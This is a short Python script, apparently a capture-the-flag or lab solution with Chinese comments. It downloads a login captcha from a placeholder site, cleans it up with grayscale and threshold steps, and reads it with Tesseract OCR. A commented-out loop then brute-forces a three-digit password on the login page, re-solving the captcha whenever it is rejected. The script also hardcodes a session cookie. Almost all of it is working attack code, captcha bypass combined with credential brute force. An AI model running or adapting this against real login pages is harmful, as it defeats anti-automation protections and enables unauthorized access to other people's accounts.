# -*- coding:utf-8 -*-
from PIL import Image
import pytesseract, requests

# 图片下载链接
image_url = 'http://url/vcode.php'
# 图片保存路径
image_path = './1.png'
# submit
url_index="http://url/login.php"

header={
    'Cookie': 'PHPSESSID=7it7m3kjj4hvrjmrbkluo3p507'
}


def image_download():
    """
    图片下载
    """
    response = requests.post(image_url,headers=header)
    with open(image_path, 'wb') as f:
        f.write(response.content)

def get_image():
    """
    用Image获取图片文件
    :return: 图片文件
    """
    image = Image.open(image_path)
    return image

def image_grayscale_deal(image):
    """
    图片转灰度处理
    :param image:图片文件
    :return: 转灰度处理后的图片文件
    """
    image = image.convert('L')
    #取消注释后可以看到处理后的图片效果
    #image.show()
    return image

def image_thresholding_method(image):
    """
    图片二值化处理
    :param image:转灰度处理后的图片文件
    :return: 二值化处理后的图片文件
    """
    # 阈值
    threshold = 160
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    # 图片二值化，此处第二个参数为数字一
    image = image.point(table, '1')
    #取消注释后可以看到处理后的图片效果
    #image.show()
    return image


def captcha_tesserocr_crack(image):
    """
    图像识别
    :param image: 二值化处理后的图片文件
    :return: 识别结果
    """
    result = pytesseract.image_to_string(image)
    return result


if __name__ == '__main__':
    image_download()
    image = get_image()
    img1 = image_grayscale_deal(image)
    img2 = image_thresholding_method(img1)
    text = captcha_tesserocr_crack(img2)[0:4].replace('O','0').replace('o','0').replace('l','1')
    # for i in range(999):
    #     payload={'pwd':str(i).zfill(3),'user_code':str(text)}
    #     ra=requests.post(url=url_index,data=payload,headers=header)
    #     print(payload,ra.content)
    #     while '验证码' in ra.content:
    #         image_download()
    #         image = get_image()
    #         img1 = image_grayscale_deal(image)
    #         img2 = image_thresholding_method(img1)
    #         text = captcha_tesserocr_crack(img2)[0:4].replace('O','0').replace('o','0').replace('l','1')
    #         payload={'pwd':str(i).zfill(3),'user_code':text}
    #         ra=requests.post(url=url_index,data=payload,headers=header)
    #         print(payload,ra.content)
    #     else:
    #         print(payload,ra.content)